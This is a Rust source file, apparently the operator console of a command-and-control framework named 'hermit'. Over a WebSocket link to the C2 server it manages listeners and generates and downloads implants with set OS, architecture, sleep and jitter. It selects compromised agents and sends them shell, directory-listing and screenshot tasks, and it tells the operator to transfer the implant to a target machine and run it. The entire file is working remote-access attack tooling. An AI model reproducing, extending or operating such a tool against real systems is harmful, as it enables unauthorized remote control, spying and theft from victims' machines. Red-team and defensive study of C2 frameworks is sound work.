use clap::{ArgMatches, Command};
use colored::Colorize;
use futures_util::{SinkExt, StreamExt};
use rustyline::{DefaultEditor, Result};
use rustyline::error::ReadlineError;
use spinners::{Spinner, Spinners};
use std::{
    process,
    sync::{Arc, Mutex},
};
use tokio_tungstenite::{
    connect_async,
    tungstenite::protocol::Message,
};

use super::options::options::Options;
use super::operations::{Operation, set_operations};
use super::cli::cmd::create_cmd;
use super::prompt::set_prompt;
use crate::utils::fs::{write_file, get_app_dir};

const EXIT_SUCCESS: i32 = 0;
// const EXIT_FAILURE: i32 = 0;

#[derive(Debug)]
struct Commands {
    pub op: Operation,
    pub options: Options
}

impl Commands {
    fn new(op: Operation, options: Options) -> Self {
        Self {
            op,
            options,
        }
    }
}

pub enum Mode {
    Root,
    Agent(String, String),
}

pub struct Client {
    pub server_host: String,
    pub server_port: u16,

    pub mode: Mode,
}

impl Client {
    pub fn new(server_host: String, server_port: u16) -> Self {
        Self {
            server_host,
            server_port,
            mode: Mode::Root,
        }
    }

    // General CLI
    fn cli(&self) -> Command {
        create_cmd(self)
    }
    
    fn parse_args(&self, args: &[String]) -> clap::error::Result<Option<Commands>> {
        let matches = self.cli().try_get_matches_from(args)?;
        self.parse_matches(&matches)
    }
    
    fn parse_matches(&self, matches: &ArgMatches) -> clap::error::Result<Option<Commands>> {
        let (op, options) = set_operations(self, matches);
    
        Ok(Some(Commands::new(op, options)))
    }
    
    pub async fn run(&mut self) -> Result<()> {
        // Connect to C2 server.
        let server_url = format!(
            "ws://{}:{}/hermit",
            self.server_host.to_owned(),
            self.server_port.to_owned());
    
        let ws_stream = match connect_async(server_url.to_string()).await {
            Ok((stream, _response)) => {
                println!("{} Handshake has been completed.", "[+]".green());
                stream
            }
            Err(e) => {
                println!("{} WebSocket handshake failed: {}", "[x]".red(), e.to_string());
                return Ok(());
            }
        };
    
        println!(
            "{} Connected to C2 server ({}) successfully.",
            "[+]".green(), server_url.to_string());
    
        let (mut sender, receiver) = ws_stream.split();
    
        // Client commands
        let mut rl = DefaultEditor::new()?;
        #[cfg(feature = "with-file-history")]
        if rl.load_history("history.txt").is_err() {
            println!("No previous history.");
        }
    
        let receiver = Arc::new(Mutex::new(receiver));
    
        loop {
            let mut message = Message::Text("".to_owned());
            let mut send_flag = String::new();

            println!(""); // Add newline before the prompt for good appearance.
            let readline = rl.readline(
                set_prompt(&self.mode).as_str());
            match readline {
                Ok(line) => {
                    // Handle input
                    let _ = rl.add_history_entry(line.as_str());
                    let mut args = match shellwords::split(&line) {
                        Ok(args) => { args }
                        Err(err) => {
                            eprintln!("Can't parse command line: {err}");
                            vec!["".to_string()]
                        }
                    };
                    args.insert(0, "client".into());
                    // Parse options
                    let commands = match self.parse_args(&args) {
                        Ok(commands) => commands,
                        Err(err) => {
                            println!("{}", err);
                            continue;
                        }
                    };
    
                    if let Some(commands) = commands {
                        match &commands.op {
                            // Root operations
                            // Listener
                            Operation::AddListener => {
                                if let Some(listener_opt) = commands.options.listener_opt {
                                    message = Message::Text(format!("listener add {} {} {}://{}:{}/",
                                        listener_opt.name.unwrap(),
                                        listener_opt.domains.unwrap().join(","),
                                        listener_opt.proto.unwrap(),
                                        listener_opt.host.unwrap(),
                                        listener_opt.port.unwrap()));
                                    send_flag = "[listener:add] Adding the listener...".to_string();
                                } else {
                                    println!("Invalid command. Run `add help` for the usage.");
                                    continue;
                                }
                            }
                            Operation::DeleteListener => {
                                if let Some(listener_opt) = commands.options.listener_opt {
                                    if let Some(name) = listener_opt.name {
                                        message = Message::Text(format!("listener delete {}", name));
                                        send_flag = "[listener:delete] Deleting the listener...".to_string();
                                    } else {
                                        println!("Specify target listener by ID or name.");
                                    }
                                } else {
                                    continue;
                                }
                            }
                            Operation::StartListener => {
                                if let Some(listener_opt) = commands.options.listener_opt {
                                    if let Some(name) = listener_opt.name {
                                        message = Message::Text(format!("listener start {}", name));
                                        send_flag = "[listener:start] Starting the listener...".to_string();
                                    } else {
                                        println!("Specify target listener by ID or name.");
                                    }
                                } else {
                                    continue;
                                }
                            }
                            Operation::StopListener => {
                                if let Some(listener_opt) = commands.options.listener_opt {
                                    if let Some(name) = listener_opt.name {
                                        message = Message::Text(format!("listener stop {}", name));
                                        send_flag = "[listener:stop] Stopping the listener...".to_string();
                                    } else {
                                        println!("Specify target listener by ID or name.");
                                        continue;
                                    }
                                } else {
                                    continue;
                                }
                            }
                            Operation::InfoListener => {
                                if let Some(listener_opt) = commands.options.listener_opt {
                                    if let Some(name) = listener_opt.name {
                                        message = Message::Text(format!("listener info {}", name));
                                        send_flag = "[listener:info] Getting the listener information...".to_string();
                                    } else {
                                        println!("Specify target listener by ID or name.");
                                        continue;
                                    }
                                } else {
                                    continue;
                                }
                            }
                            Operation::ListListeners => {
                                message = Message::Text("listener list".to_string());
                                send_flag = "[listener:list] Getting the listener list...".to_string()
                            }
                            // Agent
                            Operation::UseAgent => {
                                if let Some(agent_opt) = commands.options.agent_opt {
                                    let ag_name = agent_opt.name;

                                    // Check if the agent exists
                                    message = Message::Text(format!("agent use {}", ag_name));
                                    send_flag = "[agent:use] Switching to the agent mode...".to_string();
                                }
                            }
                            Operation::DeleteAgent => {
                                if let Some(agent_opt) = commands.options.agent_opt {
                                    let ag_name = agent_opt.name;
                                    message = Message::Text(format!("agent delete {}", ag_name));
                                    send_flag = "[agent:delete] Deleting the agent...".to_string();
                                }
                            }
                            Operation::InfoAgent => {
                                if let Some(agent_opt) = commands.options.agent_opt {
                                    let ag_name = agent_opt.name;
                                    message = Message::Text(format!("agent info {}", ag_name));
                                    send_flag = "[agent:info] Getting the agent information...".to_string();
                                }
                            }
                            Operation::ListAgents => {
                                message = Message::Text("agent list".to_string());
                                send_flag = "[agent:list] Getting the agent list...".to_string();
                            }
                            // Implant
                            Operation::GenerateImplant => {
                                if let Some(implant_opt) = commands.options.implant_opt {
                                    let name = implant_opt.name.unwrap();
                                    let url = implant_opt.url.unwrap();
                                    let os = implant_opt.os.unwrap();
                                    let arch = implant_opt.arch.unwrap();
                                    let format = implant_opt.format.unwrap();
                                    let sleep = implant_opt.sleep.unwrap();
                                    let jitter = implant_opt.jitter.unwrap();

                                    message = Message::Text(
                                        format!("implant gen {} {} {} {} {} {} {}",
                                            name, url, os, arch, format, sleep, jitter));
                                    send_flag = "[implant:gen] Generating the implant...".to_string();
                                } else {
                                    continue;
                                }

                            }
                            Operation::DownloadImplant => {
                                if let Some(implant_opt) = commands.options.implant_opt {
                                    let name = implant_opt.name.unwrap();

                                    message = Message::Text(
                                        format!("implant download {}", name)
                                    );
                                    send_flag = "[implant:download] Downloading the implant...".to_string();
                                } else {
                                    continue;
                                }
                            }
                            Operation::DeleteImplant => {
                                if let Some(implant_opt) = commands.options.implant_opt {
                                    let name = implant_opt.name.unwrap();

                                    message = Message::Text(
                                        format!("implant delete {}", name)
                                    );
                                    send_flag = "[implant:delete] Deleting the implant...".to_string();
                                }
                            }
                            Operation::InfoImplant => {
                                if let Some(implant_opt) = commands.options.implant_opt {
                                    let name = implant_opt.name.unwrap();

                                    message = Message::Text(
                                        format!("implant info {}", name)
                                    );
                                    send_flag = "[implant:info] Getting the information of implant...".to_string();
                                }
                            }
                            Operation::ListImplants => {
                                message = Message::Text("implant list".to_string());
                                send_flag = "[implant:list] Getting the implant list...".to_string();
                            }
                            // Misc
                            Operation::Empty => {
                                continue;
                            }
                            Operation::Exit => {
                                process::exit(EXIT_SUCCESS);
                            }
                            Operation::Unknown => {
                                println!("{} Unknown command. Run `help` for the usage.", "[!]".yellow());
                                continue;
                            }

                            // Agent operations
                            // Tasks
                            Operation::AgentTaskCd => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                let t_args = task_opt.args.unwrap();
                                message = Message::Text(format!("task {} cd {}", t_agent, t_args));
                                send_flag = "[task:set] Sending the task and waiting for the result...".to_string();
                            }
                            Operation::AgentTaskLs => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                let t_args = task_opt.args.unwrap();
                                message = Message::Text(format!("task {} ls {}", t_agent, t_args));
                                send_flag = "[task:set] Sending the task and waiting for the result...".to_string();
                            }
                            Operation::AgentTaskPwd => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                message = Message::Text(format!("task {} pwd", t_agent));
                                send_flag = "[task:set] Sending the task and waiting for the result...".to_string();
                            }
                            Operation::AgentTaskScreenshot => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                message = Message::Text(format!("task {} screenshot", t_agent));
                                send_flag = "[task:set] Sending the task and waiting for the result...".to_string();
                            }
                            Operation::AgentTaskShell => {
                                let task_opt = commands.options.task_opt.unwrap();
                                let t_agent = task_opt.agent_name.unwrap();
                                let t_args = task_opt.args.unwrap();
                                message = Message::Text(format!("task {} shell {}", t_agent, t_args));
                                send_flag = "[task:set] Sending the task...".to_string();
                            }
                            // Misc
                            Operation::AgentEmpty => {
                                continue;
                            }
                            Operation::AgentExit => {
                                println!("{} Exit the agent mode.", "[+]".green());
                                self.mode = Mode::Root;
                                continue;
                            }
                            Operation::AgentUnknown => {
                                println!("{} Unknown command. Run `help` for the usage.", "[!]".yellow());
                                continue;
                            }
                        }
                    }
                },
                Err(ReadlineError::Interrupted) => {
                    break
                },
                Err(ReadlineError::Eof) => {
                    break
                },
                Err(err) => {
                    println!("[x] {} {:?}", "Error: ", err);
                    continue;
                }
            }

            // Send command
            // sender.send(Message::Text(line.to_owned())).await.expect("Can not send.");
            sender.send(message.to_owned()).await.expect("Can not send.");

            // Spinner while waiting for responses
            let mut spin: Option<Spinner> = None;
            match shellwords::split(&send_flag) {
                Ok(args) => {
                    spin = Some(Spinner::new(
                        Spinners::Dots8,
                        args[1..].join(" ")
                    ));
                }
                Err(_) => {}
            }
                    
            // Receive responses
            let mut receiver_lock = receiver.lock().unwrap();
            let mut recv_flag = String::new();

            let mut allbytes: Vec<u8> = Vec::new();

            while let Some(Ok(msg)) = receiver_lock.next().await {
                match msg {
                    Message::Text(text) => {
                        // Parse the text
                        let args = match shellwords::split(&text) {
                            Ok(args) => args,
                            Err(err) => {
                                eprintln!("Can't parse the received message: {err}");
                                vec!["".to_string()]
                            },
                        };

                        match args[0].as_str() {
                            "[done]" => break,
                            "[listener:add:ok]" | "[listener:delete:ok]" |
                            "[listener:start:ok]" | "[listener:stop:ok]" |
                            "[listener:list:ok]" |
                            "[agent:delete:ok]" |
                            "[implant:delete:ok]" => {
                                stop_spin(&mut spin);
                                println!("{} {}", "[+]".green(), args[1..].join(" ").to_owned());
                            }
                            "[listener:add:error]" | "[listener:delete:error]" |
                            "[listener:start:error]" | "[listener:stop:error]" |
                            "[listener:info:error]" | "[listener:list:error]" |
                            "[agent:use:error]" | "[agent:delete:error]" |
                            "[agent:info:error]" | "[agent:list:error]" |
                            "[implant:gen:error]" | "[implant:delete:error]" |
                            "[implant:info:error]" | "[implant:list:error]" |
                            "[task:error]" => {
                                stop_spin(&mut spin);
                                println!("{} {}", "[x]".red(), args[1..].join(" ").to_owned());
                            }
                            "[agent:use:ok]" => {
                                // Switch to the agent mode
                                self.mode = Mode::Agent(args[1].to_owned(), args[2].to_owned());
                                stop_spin(&mut spin);
                                println!("{} The agent found. Switch to the agent mode.", "[+]".green());
                            }
                            "[implant:gen:ok:sending]" |
                            "[implant:gen:ok:complete]" |
                            "[task:screenshot:ok]" | "[task:shell:ok]" => {
                                // Will receive binary data after that, so don't stop the spinner yet.
                                recv_flag = args.join(" ");
                            }
                            _ => {
                                stop_spin(&mut spin);
                                println!("{text}");
                            },
                        }

                    }
                    Message::Binary(bytes) => {
                        // Parse recv flag
                        let args = match shellwords::split(&recv_flag) {
                            Ok(args) => args,
                            Err(err) => {
                                eprintln!("Can't parse command line: {err}");
                                vec!["".to_string()]
                            },
                        };

                        match args[0].as_str() {
                            "[implant:gen:ok:sending]" => {
                                allbytes.extend(&bytes);
                            }
                            "[implant:gen:ok:complete]" => {
                                allbytes.extend(&bytes);

                                let outfile = args[1].to_string();
                                write_file(outfile.to_string(), &allbytes).unwrap();
                                stop_spin(&mut spin);
                                println!(
                                    "{} Implant generated at {}",
                                    "[+]".green(),
                                    format!("{}/{}", get_app_dir(), outfile.to_string()).cyan());
                                println!(
                                    "{} Transfer this file to target machine and execute it to interact with our C2 server.",
                                    "[i]".green());
                            }
                            "[task:screenshot:ok]" => {
                                let outfile = args[1].to_string();
                                write_file(outfile.to_string(), &bytes).unwrap();
                                stop_spin(&mut spin);
                                println!(
                                    "{} Screenshot saved at {}",
                                    "[+]".green(),
                                    format!("{}/{}", get_app_dir(), outfile.to_string()).cyan());
                            }
                            "[task:shell:ok]" => {
                                // TODO: Fix garbled characters other than English.
                                let result_string = String::from_utf8_lossy(&bytes).to_string();
                                stop_spin(&mut spin);
                                println!("{} {}", "[+]".green(), result_string);
                            }
                            _ => {}
                        }
                    }
                    Message::Close(c) => {
                        if let Some(cf) = c {
                            println!(
                                "Close with code {} and reason `{}`",
                                cf.code, cf.reason
                            );
                        } else {
                            println!("Somehow got close message without CloseFrame");
                        }
                        process::exit(EXIT_SUCCESS);
                    }
                    Message::Frame(_) => {
                        unreachable!("This is never supposed to happen")
                    }
                    _ => { break }
                }
            }
        }
    
        #[cfg(feature = "with-file-history")]
        rl.save_history("history.txt");
    
        Ok(())
    }
}

fn stop_spin(spin: &mut Option<Spinner>) {
    if let Some(ref mut spin) = spin {
        spin.stop();
        println!(""); // Add newline for good appearance.
    }
}
